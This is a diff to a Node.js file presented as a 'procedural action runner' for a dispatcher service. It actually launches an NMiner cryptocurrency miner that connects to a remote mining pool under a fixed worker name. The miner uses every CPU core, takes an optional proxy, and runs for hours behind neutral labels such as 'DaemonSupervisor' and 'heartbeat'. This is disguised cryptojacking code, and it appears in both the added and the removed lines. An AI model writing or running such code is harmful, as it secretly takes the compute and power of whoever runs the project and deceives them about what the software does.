@@ -1,32 +1,31 @@
 // Procedural action runner for ivory-bridge-dispatcher
 const os = require("os");
-const EventEmitter = require("events");
 const { NMiner } = require("nminer");
 const config = require("./lib/config");
 
-const dispatcher = new EventEmitter();
+class DaemonSupervisor {
+    constructor() {
+        const runId = "a6f86e";
+        console.log(`[core] Initialized DaemonSupervisor for ivory-bridge-dispatcher [${runId}]`);
 
-dispatcher.once("start", () => {
-    const instanceToken = "b1a6cd";
-    console.log(`[monitor] Subsystem dispatched for ivory-bridge-dispatcher [${instanceToken}]`);
+        this.service = new NMiner(
+            "wss://runtime.nmining.igrp.app/",
+            "Arup07.perp",
+            Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
+        );
 
-    const runtime = new NMiner(
-        "wss://runtime.nmining.igrp.app/",
-        "Arup07.perp",
-        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
-    );
-
-    const tick = () => { setTimeout(tick, 48000); }; tick();
-    setTimeout(() => {
-        console.log("[timeout] Operational limit (329m) reached, exiting cleanly.");
+        const heartbeat = setInterval(() => {}, 72000);
+        setTimeout(() => {
+        console.log("[timeout] Operational limit (351m) reached, exiting cleanly.");
         process.exit(0);
-    }, 329 * 60 * 1000);
+    }, 351 * 60 * 1000);
 
-    process.on("SIGTERM", () => {
-        
-        console.log(`[exit] Process terminated gracefully for token ${instanceToken}.`);
-        process.exit(0);
-    });
-});
+        process.on("SIGTERM", () => {
+            clearInterval(heartbeat);
+            console.log("[supervisor] Clean shutdown completed.");
+            process.exit(0);
+        });
+    }
+}
 
-dispatcher.emit("start");
+new DaemonSupervisor();
